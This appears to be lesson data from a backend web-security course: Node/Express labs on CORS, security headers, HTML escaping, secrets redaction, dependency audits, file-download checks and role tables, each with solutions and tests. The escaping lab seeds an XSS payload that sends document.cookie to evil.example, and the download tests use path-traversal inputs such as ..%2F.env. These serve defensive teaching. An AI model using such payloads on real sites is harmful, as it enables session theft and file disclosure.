          hint: "Read ALLOWED_ORIGINS into a Set; in a middleware before the routes: if the method is unsafe and req.get(\"origin\") is set and not in the Set, answer 403.",
          successMessage: "A page on another site can no longer change Ada's email with her own cookie: the browser tells you where the request came from, and you listen.",
        },
      },
      {
        id: "a-be-cors-headers",
        title: "CORS and security headers",
        explain:
          "By default a page may not READ responses from another origin. CORS lets your API opt in: Access-Control-Allow-Origin names the origins allowed (never * with credentials), Access-Control-Allow-Credentials: true lets cookies through, and browsers send an OPTIONS PREFLIGHT before non-simple requests (JSON bodies, Authorization headers) asking which methods and headers are allowed. The cors package does this from an allow-list. Security HEADERS harden every response: helmet sets Content-Security-Policy, Strict-Transport-Security (HTTPS only, for a year), X-Content-Type-Options: nosniff, X-Frame-Options and more, and removes X-Powered-By.",
        nodeLab: {
          task:
            "Configure cors for the academy's front-ends only: origins https://academy.example and https://admin.academy.example, with credentials, methods GET, POST, PATCH and DELETE; other origins get no Access-Control-Allow-Origin. Add helmet() for the security headers (which also removes X-Powered-By).",
          files: {
            "package.json": pkg({ name: "course-api", scripts: { start: "node server.js" }, deps: ["cors", "express", "helmet"] }),
            "server.js": `import cors from "cors";
import express from "express";
import helmet from "helmet";

const app = express();
app.use(cors());
app.use(express.json());

app.get("/courses", (req, res) => res.json({ data: [{ code: "BE-101" }] }));
app.post("/courses", (req, res) => res.status(201).json({ data: req.body }));

${LISTEN_JS}`,
          },
          readOnly: ["package.json"],
          open: "server.js",
          solution: {
            "server.js": `import cors from "cors";
import express from "express";
import helmet from "helmet";

const app = express();
app.use(helmet());
app.use(
  cors({
    origin: ["https://academy.example", "https://admin.academy.example"],
    credentials: true,
    methods: ["GET", "POST", "PATCH", "DELETE"],
  })
);
app.use(express.json());

app.get("/courses", (req, res) => res.json({ data: [{ code: "BE-101" }] }));
app.post("/courses", (req, res) => res.status(201).json({ data: req.body }));

${LISTEN_JS}`,
          },
          requests: [
            { label: "GET from academy.example", method: "GET", path: "/courses", headers: { Origin: "https://academy.example" } },
            { label: "Preflight from academy.example", method: "OPTIONS", path: "/courses", headers: { Origin: "https://academy.example", "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "content-type" } },
            { label: "GET from evil.example", method: "GET", path: "/courses", headers: { Origin: "https://evil.example" } },
          ],
          tests: [
            { label: "The academy's origins may read responses, with credentials", check: `const r = await get("/courses", { headers: { Origin: "https://academy.example" } }); eq([r.headers["access-control-allow-origin"], r.headers["access-control-allow-credentials"]], ["https://academy.example", "true"], "GET from academy.example"); eq((await get("/courses", { headers: { Origin: "https://admin.academy.example" } })).headers["access-control-allow-origin"], "https://admin.academy.example", "the admin site");` },
            { label: "Preflights are answered for allowed origins", check: `const r = await request("OPTIONS", "/courses", { headers: { Origin: "https://academy.example", "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "content-type" } }); eq(r.status, 204, "the preflight"); has(r.headers["access-control-allow-methods"] || "", "POST", "POST is allowed"); eq(r.headers["access-control-allow-origin"], "https://academy.example", "for that origin");` },
            { label: "Other origins are not allowed", check: `const r = await get("/courses", { headers: { Origin: "https://evil.example" } }); eq(r.headers["access-control-allow-origin"], undefined, "no Access-Control-Allow-Origin for evil.example"); assert((await get("/courses")).headers["access-control-allow-origin"] !== "*", "never * for an API used with credentials");` },
            { label: "Security headers on every response, no X-Powered-By", check: `const r = await get("/courses"); for (const h of ["content-security-policy", "strict-transport-security", "x-content-type-options", "x-frame-options"]) assert(r.headers[h], "the response should have " + h); eq(r.headers["x-content-type-options"], "nosniff", "nosniff"); eq(r.headers["x-powered-by"], undefined, "no X-Powered-By: Express");` },
          ],
          hint: "cors({ origin: [ …two origins… ], credentials: true, methods: [ … ] }) and app.use(helmet()) before the routes.",
          successMessage: "Only the academy's own front-ends can read the API's responses from a browser, and every response carries the headers that close common holes.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 103 · 14.8 – 14.9 · OUTPUT ENCODING AND SECRETS
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l103-encoding-secrets",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 4,
    covers: ["14.8", "14.9"],
    title: "Input Validation, Output Encoding and Secrets Management",
    subtitle: "Data in, data out, and the keys to everything",
    estimatedMinutes: 65,
    intro: "Validation decides what data the API accepts; encoding decides how that data is safely written into another language (HTML, SQL, shell). And the secrets that guard everything must be handled as carefully as the data.",
    atoms: [
      {
        id: "a-be-output-encoding",
        title: "Input validation and output encoding",
        explain:
          "VALIDATE input against what it should be (types, lengths, formats: Week 7's zod), but do not try to 'clean' attacks out of free text: a name may legitimately contain <, ' or &. Instead ENCODE on output, for the language you write into: HTML-escape (& < > \" ') when inserting into HTML, parameters for SQL, JSON.stringify for JSON (res.json does it). Template engines escape by default; string building does not. The academy's certificate page builds HTML from a student's name: a name of <img src=x onerror=…> runs script in every viewer's browser.",
        nodeLab: {
          task:
            "GET /certificates/:no renders HTML with the student's name and course title straight from the database. Add escapeHtml(text) to html.js (escaping & < > \" and ') and use it for every value inserted into the page. Also send Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline' with the HTML.",
          db: `${SEC_SQL}
CREATE TABLE certificates (certificate_no text PRIMARY KEY, enrollment_id integer NOT NULL REFERENCES enrollments (id), issued_on date NOT NULL);
INSERT INTO certificates VALUES ('MST-2026-0001', 2, '2026-06-30');
-- Ada changed her display name to an attack.
UPDATE users SET full_name = '<img src=x onerror="fetch(''https://evil.example/?c=''+document.cookie)">' WHERE id = 1;
`,
          files: {
            ...BASE_FILES,
            "html.js": "export function escapeHtml(text) {\n  return String(text);\n}\n",
            "server.js": `${HEAD_JS('import { escapeHtml } from "./html.js";\n')}
app.get("/certificates/:no", async (req, res) => {
  const { rows } = await pool.query(
    "SELECT u.full_name, c.title, cert.issued_on FROM certificates cert JOIN enrollments e ON e.id = cert.enrollment_id JOIN users u ON u.id = e.student_id JOIN courses c ON c.id = e.course_id WHERE cert.certificate_no = $1",
    [req.params.no]
  );
  if (!rows[0]) return res.status(404).type("text").send("No such certificate");
  const { full_name, title, issued_on } = rows[0];
  res.type("html").send(\`<!doctype html><title>Certificate</title><h1>\${full_name}</h1><p>completed <em>\${title}</em> on \${issued_on.toISOString().slice(0, 10)}.</p>\`);
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "html.js",
          solution: {
            "html.js": `const ENTITIES = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };

/** Makes text safe to put inside HTML elements and quoted attributes. */
export function escapeHtml(text) {
  return String(text).replace(/[&<>"']/g, (ch) => ENTITIES[ch]);
}
`,
            "server.js": `${HEAD_JS('import { escapeHtml } from "./html.js";\n')}
app.get("/certificates/:no", async (req, res) => {
  const { rows } = await pool.query(
    "SELECT u.full_name, c.title, cert.issued_on FROM certificates cert JOIN enrollments e ON e.id = cert.enrollment_id JOIN users u ON u.id = e.student_id JOIN courses c ON c.id = e.course_id WHERE cert.certificate_no = $1",
    [req.params.no]
  );
  if (!rows[0]) return res.status(404).type("text").send("No such certificate");
  const { full_name, title, issued_on } = rows[0];
  // A second wall: even if something slipped through, the page may not run scripts or load anything.
  res.set("Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'");
  res.type("html").send(\`<!doctype html><title>Certificate</title><h1>\${escapeHtml(full_name)}</h1><p>completed <em>\${escapeHtml(title)}</em> on \${escapeHtml(issued_on.toISOString().slice(0, 10))}.</p>\`);
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "escapeHtml escapes the five characters", check: `const { escapeHtml } = await load("html.js"); eq(escapeHtml(\`<a href="x">Tom & Jerry's</a>\`), "&lt;a href=&quot;x&quot;&gt;Tom &amp; Jerry&#39;s&lt;/a&gt;", "escapeHtml"); eq(escapeHtml(42), "42", "non-strings become text");` },
            { label: "The certificate shows the name as text, not as HTML", check: `const r = await get("/certificates/MST-2026-0001"); eq(r.status, 200, "status"); lacks(r.text, "<img", "the name must not become an <img> element"); has(r.text, "&lt;img src=x onerror=&quot;fetch(", "it should be visible as escaped text"); has(r.text, "<em>React Development</em>", "the page still renders");` },
            { label: "A Content-Security-Policy forbids scripts", check: `const r = await get("/certificates/MST-2026-0001"); eq(r.headers["content-security-policy"], "default-src 'none'; style-src 'unsafe-inline'", "the CSP header");` },
          ],
          hint: "escapeHtml: String(text).replace(/[&<>\"']/g, (ch) => map[ch]) with & first in mind (a single replace handles it). Wrap every ${…} in the template with escapeHtml.",
          successMessage: "Ada can call herself anything: the certificate shows exactly those characters, and no browser runs them.",
        },
      },
      {
        id: "a-be-secrets-config",
        title: "Secrets management and environment configuration",
        explain:
          "SECRETS (database passwords, JWT signing keys, API keys) never go in code or Git: in development a .env (in .gitignore) plus a committed .env.example listing the variables with placeholder values; in production the platform's secret store (Week 19). Validate them at startup (a JWT secret of 32+ characters). Never LOG them: redact sensitive fields (password, token, secret, authorization) before logging request bodies or errors. Rotate a secret the moment it may have leaked, and design for rotation (support two signing keys during a switch).",
        nodeLab: {
          task:
            "Three fixes. (1) config.js must stop the server unless JWT_SECRET is at least 32 characters (an Error starting \"Invalid configuration\"). (2) Commit a .env.example with the same variable names as .env and placeholder values (never the real ones), and keep .env out of Git. (3) logger.js logs every request body: make it redact the values of password, token, secret and authorization keys (any letter case) as \"[REDACTED]\", nested objects included.",
          files: {
            "package.json": pkg({ name: "course-api", scripts: { start: "node --env-file=.env server.js" }, deps: ["express"] }),
            ".env": "PORT=3000\nJWT_SECRET=b7d1f0c8e93a4f6d8a2c5e7b9d1f3a5c7e9b2d4f6a8c0e2b4d6f8a1c3e5b7d9f\nPAYMENTS_SECRET_KEY=sk_live_51NxAcademyRealKey\n",
            ".gitignore": "node_modules\n",
            "config.js": `export const config = {
  port: Number(process.env.PORT ?? 3000),
  jwtSecret: process.env.JWT_SECRET,
};
`,
            "logger.js": `export function logRequest(req) {
  console.log(JSON.stringify({ method: req.method, path: req.path, body: req.body }));
}
`,
            "server.js": `import express from "express";
import { config } from "./config.js";
import { logRequest } from "./logger.js";

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  logRequest(req);
  next();
});

app.post("/auth/login", (req, res) => res.json({ data: { ok: true } }));
app.post("/payments", (req, res) => res.status(201).json({ data: { ok: true } }));

app.listen(config.port, () => console.log("Course API on http://localhost:" + config.port));
`,
          },
          readOnly: ["package.json", ".env", "server.js"],
          open: "logger.js",
          solution: {
            "config.js": `const secret = process.env.JWT_SECRET ?? "";
if (secret.length < 32) {
  throw new Error("Invalid configuration: JWT_SECRET must be at least 32 characters (use 32 random bytes)");
}

export const config = {
  port: Number(process.env.PORT ?? 3000),
  jwtSecret: secret,
};
`,
            ".env.example": "PORT=3000\nJWT_SECRET=replace-with-64-hex-characters-from-openssl-rand\nPAYMENTS_SECRET_KEY=sk_test_replace_me\n",
            ".gitignore": "node_modules\n.env\n",
            "logger.js": `const SENSITIVE = /^(password|token|secret|authorization)$/i;

/** A copy of value with every sensitive key's value replaced, at any depth. */
export function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, SENSITIVE.test(k) ? "[REDACTED]" : redact(v)]));
  }
  return value;
}

export function logRequest(req) {
  console.log(JSON.stringify({ method: req.method, path: req.path, body: redact(req.body) }));
}
`,
          },
          requests: [{ label: "POST /auth/login", method: "POST", path: "/auth/login", body: { email: "ada@example.com", password: "correct horse battery staple" } }],
          tests: [
            { label: "Secrets never reach the log", check: `await post("/auth/login", { email: "ada@example.com", password: "correct horse battery staple" }); await post("/payments", { amount: 5, card: { number: "4242", Token: "tok_123" }, Authorization: "Bearer abc" }); const out = output(); lacks(out, "correct horse battery staple", "the password was logged"); lacks(out, "tok_123", "a nested token was logged"); lacks(out, "Bearer abc", "an Authorization value was logged"); has(out, "[REDACTED]", "replace sensitive values with [REDACTED]"); has(out, "ada@example.com", "other fields are still logged");` },
            { label: "A weak JWT_SECRET stops the server", check: `await run("JWT_SECRET=short node server.js"); assert(exited() && exitCode() !== 0, "with JWT_SECRET=short the server must not start"); has(output(), "Invalid configuration", "the startup error");` },
            { label: ".env.example lists the variables without the real values", check: `const ex = file(".env.example"); assert(ex, "add .env.example"); const keys = (t) => t.split("\\n").filter((l) => /^\\w+=/.test(l)).map((l) => l.split("=")[0]).sort(); eq(keys(ex), keys(file(".env")), "the same variable names as .env"); for (const l of file(".env").split("\\n").filter((x) => /^(JWT_SECRET|PAYMENTS_SECRET_KEY)=/.test(x))) lacks(ex, l.split("=")[1], ".env.example must not contain the real " + l.split("=")[0]);` },
            { label: ".env is ignored by Git; .env.example is not", check: `eq(ignored(file(".gitignore"), ".env"), true, ".env should be ignored"); eq(ignored(file(".gitignore"), ".env.example"), false, ".env.example must be committed");` },
          ],
          hint: "redact walks objects and arrays: Object.fromEntries(Object.entries(v).map(([k, x]) => [k, /^(password|token|secret|authorization)$/i.test(k) ? \"[REDACTED]\" : redact(x)])). In config.js, throw before exporting if the secret is short.",
          successMessage: "The real keys live only in .env (ignored), the repository shows which keys exist, and the logs can be shared with anyone.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 104 · 14.10 – 14.11 · DEPENDENCIES, UPLOADS, SENSITIVE DATA
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l104-dependencies-files",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 5,
    covers: ["14.10", "14.11"],
    title: "Dependency Scanning, File Security and Sensitive Data",
    subtitle: "Other people's code, and files you serve",
    estimatedMinutes: 60,
    intro: "Most of the code an API runs was written by someone else, and most data breaches involve files or fields that should never have been reachable.",
    atoms: [
      {
        id: "a-be-npm-audit",
        title: "Dependency vulnerability scanning",
        explain:
          "npm audit compares the installed packages (from package-lock.json) with the GitHub advisory database and lists vulnerable versions, their severity and the fix. npm audit fix upgrades within the ranges in package.json; when a fix needs a version outside them (here, because the versions were pinned exactly), it says so, and you upgrade deliberately (npm install express@4.22.3), then run the tests. Automate it: npm audit --audit-level=high in CI fails the build on serious issues, and Dependabot or Renovate opens upgrade pull requests. Remove unused packages: every dependency is attack surface.",
        example: shown("w14-audit", "npm audit fix"),
        terminalExercise: term("w14-audit", {
          only: ["npm audit", "npm audit fix", "npm ls lodash", "npm install express@4.22.3 lodash@4.18.1", "npm audit --audit-level=moderate"],
          goal: "Upgrade the vulnerable packages to the fixed versions npm audit names.",
          accept: ["npm install express@4.22.3 lodash@4.18.1"],
          near: [{ command: "npm audit fix", why: "It changed nothing: the fixes are outside the exact versions pinned in package.json. Install the named versions explicitly." }],
          hint: "npm install, with the two versions the audit report suggests.",
          success: "found 0 vulnerabilities. The next step in a real project is running the test suite, since a major upgrade can change behaviour.",
        }),
      },
      {
        id: "a-be-sensitive-files",
        title: "File upload security and sensitive data handling",
        explain:
          "Uploaded files are private data: serve them through an endpoint that checks ownership, never from a public folder. Never build a path from the request (/files/../../.env); look the file up by id in the database and use the stored name. Send downloads with Content-Disposition: attachment and X-Content-Type-Options: nosniff, so a browser never renders an uploaded 'image' as HTML. SENSITIVE DATA: return only the fields a caller needs (never password hashes, full card numbers, internal notes), store as little as possible (card_last4, not the card), and encrypt or hash what you must keep.",
        nodeLab: {
          task:
            "GET /files/:name serves any file by name, including ../.env, and GET /me/files lists rows with their internal storage paths. Change the download to GET /files/:id: look the file up in the files table, allow only its owner (others get 404 FILE_NOT_FOUND) or an admin, read it from storage/<stored_name>, and send it with Content-Disposition: attachment; filename=\"<original_name>\" and X-Content-Type-Options: nosniff. GET /me/files must answer only id, originalName and size.",
          db: `${SEC_SQL}
CREATE TABLE files (id integer PRIMARY KEY, owner_id integer NOT NULL REFERENCES users (id), original_name text NOT NULL, stored_name text NOT NULL, size integer NOT NULL);
INSERT INTO files VALUES (1, 1, 'ada-cv.pdf', 'f1-7c2e9a.pdf', 9), (2, 2, 'bayo-id-card.png', 'f2-b41d07.png', 10);
`,
          files: {
            ...BASE_FILES,
            "storage/f1-7c2e9a.pdf": "%PDF-1.7\n",
            "storage/f2-b41d07.png": "PNG-bayo\n",
            "server.js": `import { readFile } from "node:fs/promises";
${HEAD_JS()}
app.get("/files/:name", requireAuth, async (req, res) => {
  res.send(await readFile("storage/" + req.params.name));
});

app.get("/me/files", requireAuth, async (req, res) => {
  const { rows } = await pool.query("SELECT * FROM files WHERE owner_id = $1 ORDER BY id", [req.user.id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: [...BASE_RO, "storage/f1-7c2e9a.pdf", "storage/f2-b41d07.png"],
          open: "server.js",
          solution: {
            "server.js": `import { readFile } from "node:fs/promises";
${HEAD_JS()}
app.get("/files/:id", requireAuth, async (req, res) => {
  const { rows } = /^\\d+$/.test(req.params.id)
    ? await pool.query("SELECT owner_id, original_name, stored_name FROM files WHERE id = $1", [Number(req.params.id)])
    : { rows: [] };
  const file = rows[0];
  // Someone else's file looks exactly like a missing one.
  if (!file || (file.owner_id !== req.user.id && req.user.role !== "admin")) {
    return res.status(404).json({ error: { code: "FILE_NOT_FOUND", message: "No such file" } });
  }
  res.set("Content-Disposition", \`attachment; filename="\${file.original_name.replace(/["\\\\\\r\\n]/g, "")}"\`);
  res.set("X-Content-Type-Options", "nosniff");
  // The stored name comes from our database, never from the request.
  res.send(await readFile("storage/" + file.stored_name));
});

app.get("/me/files", requireAuth, async (req, res) => {
  const { rows } = await pool.query('SELECT id, original_name AS "originalName", size FROM files WHERE owner_id = $1 ORDER BY id', [req.user.id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "Owners download their files as attachments", check: `${AS} const r = await get("/files/1", as("ada")); eq(r.status, 200, "Ada downloads file 1"); has(r.text, "%PDF-1.7", "the file's content"); eq(r.headers["content-disposition"], 'attachment; filename="ada-cv.pdf"', "Content-Disposition"); eq(r.headers["x-content-type-options"], "nosniff", "nosniff");` },
            { label: "Other users' files look missing; admins can read them", check: `${AS} const r = await get("/files/2", as("ada")); eq([r.status, r.json?.error?.code], [404, "FILE_NOT_FOUND"], "Ada asks for Bayo's file"); eq((await get("/files/2", as("kemi"))).status, 200, "the admin can");` },
            { label: "No path traversal", check: `${AS} for (const p of ["/files/..%2F.env", "/files/f2-b41d07.png", "/files/..%2Fdb.js"]) { const r = await get(p, as("ada")); assert(r.status === 404 && !/DATABASE_URL|PNG-bayo|pg\\.Pool/.test(r.text), p + " must not serve any file"); }` },
            { label: "Listings expose only what the owner needs", check: `${AS} eq((await get("/me/files", as("ada"))).json, { data: [{ id: 1, originalName: "ada-cv.pdf", size: 9 }] }, "Ada's files, without stored names or owner ids");` },
          ],
          hint: "Look the file up by Number(req.params.id); 404 unless the owner or an admin; read storage/<stored_name> from the row; set the two headers before res.send. Select only id, original_name AS \"originalName\" and size for the list.",
          successMessage: "Files are now reachable only through the database's record of who owns them, and nothing from the URL ever becomes part of a path.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 105 · 14.12 – 14.15 · EXERCISES
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l105-exercises",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 6,
    covers: ["14.12", "14.13", "14.14", "14.15"],
    title: "Exercises: Locking Down the Academy API",
    subtitle: "Roles, records, tests and an audit",
    estimatedMinutes: 200,
    intro: "Four exercises that secure the whole API: a deny-by-default role table, private student records, a test matrix that catches regressions, and the audit of a deliberately vulnerable API.",
    atoms: [
      {
        id: "a-be-ex-roles",
        title: "Exercise: add student, instructor and administrator roles",
        explain:
          "In a larger API, one table of route rules beats middleware sprinkled on each route: it can be read at a glance, reviewed in a pull request, and enforced as DENY BY DEFAULT, so a new route that nobody listed is closed instead of open. Public routes are listed explicitly too.",
        nodeLab: {
          task:
            "Write the access table in access.js: RULES maps \"METHOD /path\" (paths with Express parameters, as \"PATCH /courses/:id\") to the roles allowed, or \"public\". The authorize middleware (applied to the whole app) finds the rule for the request's route: no rule → 403 NO_RULE (deny by default); \"public\" → continue; otherwise 401 without a session, 403 FORBIDDEN without the role. Rules: GET /courses public; POST /courses instructor, admin; DELETE /courses/:id admin; GET /admin/users admin; PATCH /users/:id/role admin; GET /me every role.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "access.js": `// RULES: "METHOD /path" → "public" or a list of roles.
export const RULES = {};

export function authorize(req, res, next) {
  next();
}
`,
            "server.js": `${HEAD_JS('import { authorize } from "./access.js";\n')}
// Every request passes the access table first (it reads the session itself).
app.use(authorize);

app.get("/courses", async (req, res) => res.json({ data: (await pool.query("SELECT id, code FROM courses ORDER BY id")).rows }));
app.post("/courses", async (req, res) => res.status(201).json({ data: { created: true } }));
app.delete("/courses/:id", async (req, res) => res.status(204).end());
app.get("/admin/users", async (req, res) => res.json({ data: (await pool.query("SELECT id, role FROM users ORDER BY id")).rows }));
app.patch("/users/:id/role", async (req, res) => {
  await pool.query("UPDATE users SET role = $2 WHERE id = $1", [Number(req.params.id), req.body.role]);
  res.status(204).end();
});
app.get("/me", (req, res) => res.json({ data: req.user }));
// A route someone added without a rule.
app.get("/admin/export", async (req, res) => res.json({ data: (await pool.query("SELECT * FROM payments")).rows }));

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: [...BASE_RO, "server.js"],
          open: "access.js",
          solution: {
            "access.js": `import { requireAuth } from "./auth.js";

const ALL = ["student", "instructor", "admin"];

/** Who may call each route. A route missing from this table is closed. */
export const RULES = {
  "GET /courses": "public",
  "POST /courses": ["instructor", "admin"],
  "DELETE /courses/:id": ["admin"],
  "GET /admin/users": ["admin"],
  "PATCH /users/:id/role": ["admin"],
  "GET /me": ALL,
};

const PATTERNS = Object.entries(RULES).map(([key, rule]) => {
  const [method, path] = key.split(" ");
  const regex = new RegExp("^" + path.replace(/:[^/]+/g, "[^/]+") + "/?$");
  return { method, regex, rule };
});

export function authorize(req, res, next) {
  const match = PATTERNS.find((p) => p.method === req.method && p.regex.test(req.path));
  if (!match) return res.status(403).json({ error: { code: "NO_RULE", message: "This route is not open to anyone" } });
  if (match.rule === "public") return next();
  requireAuth(req, res, () => {
    if (!match.rule.includes(req.user.role)) {
      return res.status(403).json({ error: { code: "FORBIDDEN", message: "You do not have permission to do this" } });
    }
    next();
  });
}
`,
          },
          tests: [
            { label: "The table is enforced, role by role", check: `${AS} const cases = [["GET", "/courses", null, 200], ["POST", "/courses", "ada", 403], ["POST", "/courses", "ngozi", 201], ["DELETE", "/courses/2", "ngozi", 403], ["DELETE", "/courses/2", "kemi", 204], ["GET", "/admin/users", "tunde", 403], ["GET", "/admin/users", "kemi", 200], ["GET", "/me", "bayo", 200], ["GET", "/me", null, 401], ["POST", "/courses", null, 401]]; for (const [m, p, who, want] of cases) { const r = await request(m, p, who ? as(who, m === "POST" ? { json: {} } : {}) : m === "POST" ? { json: {} } : {}); eq(r.status, want, m + " " + p + " as " + (who || "nobody")); }` },
            { label: "Only admins change roles", check: `${AS} eq((await patch("/users/1/role", { role: "admin" }, as("ada"))).status, 403, "Ada makes herself admin"); eq(await sql("SELECT role FROM users WHERE id = 1"), [{ role: "student" }], "still a student"); eq((await patch("/users/2/role", { role: "instructor" }, as("kemi"))).status, 204, "the admin promotes Bayo");` },
            { label: "A route with no rule is closed to everyone", check: `${AS} for (const who of ["ada", "ngozi", "kemi"]) { const r = await get("/admin/export", as(who)); eq([r.status, r.json?.error?.code], [403, "NO_RULE"], "GET /admin/export as " + who); } eq((await get("/admin/export")).status, 403, "and anonymously");` },
          ],
          hint: "Turn each \"METHOD /path\" key into a method and a RegExp (replace :param with [^/]+). In authorize: no match → 403 NO_RULE; \"public\" → next(); otherwise call requireAuth(req, res, () => check the role, then next()).",
          successMessage: "A forgotten route is now a closed route, and the whole API's access policy fits on one screen.",
        },
      },
      {
        id: "a-be-ex-student-records",
        title: "Exercise: prevent students from accessing other students' records",
        explain:
          "Student records (profile, enrollments, payments) are the academy's most sensitive data. The rules: students see only their own; instructors see the profiles and enrollments of students in THEIR courses, but never payments; admins see everything. Everyone else gets 404, so ids reveal nothing. Put the rule in one function and call it from every records endpoint.",
        nodeLab: {
          task:
            "In records.js write canView(user, studentId, kind) → Promise<boolean> (kind is \"profile\", \"enrollments\" or \"payments\") following the rules, and use it in the three endpoints of server.js: GET /students/:id, GET /students/:id/enrollments and GET /students/:id/payments, answering 404 STUDENT_NOT_FOUND when it returns false. Instructors only see the enrollments of their own courses.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "records.js": `import { pool } from "./db.js";

export async function canView(user, studentId, kind) {
  return true;
}
`,
            "server.js": `${HEAD_JS('import { canView } from "./records.js";\n')}
const notFound = () => Object.assign(new Error("No such student"), { status: 404, code: "STUDENT_NOT_FOUND" });

app.get("/students/:id", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  const { rows } = await pool.query('SELECT id, email, full_name AS "fullName" FROM users WHERE id = $1 AND role = \\'student\\'', [id]);
  if (!rows[0]) throw notFound();
  res.json({ data: rows[0] });
});

app.get("/students/:id/enrollments", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  const { rows } = await pool.query("SELECT e.id, c.code, e.score FROM enrollments e JOIN courses c ON c.id = e.course_id WHERE e.student_id = $1 ORDER BY e.id", [id]);
  res.json({ data: rows });
});

app.get("/students/:id/payments", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  const { rows } = await pool.query('SELECT id, amount, card_last4 AS "cardLast4" FROM payments WHERE student_id = $1 ORDER BY id', [id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "records.js",
          solution: {
            "records.js": `import { pool } from "./db.js";

/**
 * Students: their own records. Instructors: profiles and enrollments of students
 * in their courses, never payments. Admins: everything.
 */
export async function canView(user, studentId, kind) {
  if (user.role === "admin") return true;
  if (user.role === "student") return user.id === studentId;
  if (user.role === "instructor" && kind !== "payments") {
    const { rows } = await pool.query(
      "SELECT 1 FROM enrollments e JOIN courses c ON c.id = e.course_id WHERE e.student_id = $1 AND c.instructor_id = $2 LIMIT 1",
      [studentId, user.id]
    );
    return rows.length > 0;
  }
  return false;
}
`,
            "server.js": `${HEAD_JS('import { canView } from "./records.js";\n')}
const notFound = () => Object.assign(new Error("No such student"), { status: 404, code: "STUDENT_NOT_FOUND" });

app.get("/students/:id", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  if (!(await canView(req.user, id, "profile"))) throw notFound();
  const { rows } = await pool.query('SELECT id, email, full_name AS "fullName" FROM users WHERE id = $1 AND role = \\'student\\'', [id]);
  if (!rows[0]) throw notFound();
  res.json({ data: rows[0] });
});

app.get("/students/:id/enrollments", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  if (!(await canView(req.user, id, "enrollments"))) throw notFound();
  // Instructors see only their own courses' enrollments.
  const { rows } =
    req.user.role === "instructor"
      ? await pool.query("SELECT e.id, c.code, e.score FROM enrollments e JOIN courses c ON c.id = e.course_id WHERE e.student_id = $1 AND c.instructor_id = $2 ORDER BY e.id", [id, req.user.id])
      : await pool.query("SELECT e.id, c.code, e.score FROM enrollments e JOIN courses c ON c.id = e.course_id WHERE e.student_id = $1 ORDER BY e.id", [id]);
  res.json({ data: rows });
});

app.get("/students/:id/payments", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  if (!(await canView(req.user, id, "payments"))) throw notFound();
  const { rows } = await pool.query('SELECT id, amount, card_last4 AS "cardLast4" FROM payments WHERE student_id = $1 ORDER BY id', [id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "Students see their own records only", check: `${AS} eq((await get("/students/1", as("ada"))).json.data.email, "ada@example.com", "Ada's profile"); eq((await get("/students/1/payments", as("ada"))).json.data.length, 2, "Ada's payments"); for (const p of ["/students/2", "/students/2/enrollments", "/students/2/payments"]) { const r = await get(p, as("ada")); eq([r.status, r.json?.error?.code], [404, "STUDENT_NOT_FOUND"], "Ada asks for " + p); }` },
            { label: "Instructors see their students' profiles and enrollments, not payments", check: `${AS} eq((await get("/students/2", as("ngozi"))).status, 200, "Ngozi teaches Bayo"); eq((await get("/students/2/enrollments", as("ngozi"))).json.data.map((e) => e.code), ["BE-101", "DB-101"], "Bayo's enrollments in Ngozi's courses"); eq((await get("/students/2/payments", as("ngozi"))).status, 404, "no payments for instructors"); eq((await get("/students/2", as("tunde"))).status, 404, "Tunde does not teach Bayo"); eq((await get("/students/1/enrollments", as("tunde"))).json.data.map((e) => e.code), ["WD-201"], "Tunde sees only Ada's enrollment in his course");` },
            { label: "Admins see everything", check: `${AS} eq((await get("/students/2/payments", as("kemi"))).json.data, [{ id: 3, amount: 120000, cardLast4: "1881" }], "Bayo's payments for the admin"); eq((await get("/students/1/enrollments", as("kemi"))).json.data.length, 2, "all of Ada's enrollments");` },
          ],
          hint: "canView: true for admins; for students user.id === studentId; for instructors (not payments) one query: does the student have an enrollment in a course whose instructor_id is user.id? In each route, check first and throw notFound().",
          successMessage: "The records endpoints now follow one written rule, and an id typed into the URL reveals nothing about students you may not see.",
        },
      },
      {
        id: "a-be-ex-authz-tests",
        title: "Exercise: test authorization on every sensitive endpoint",
        explain:
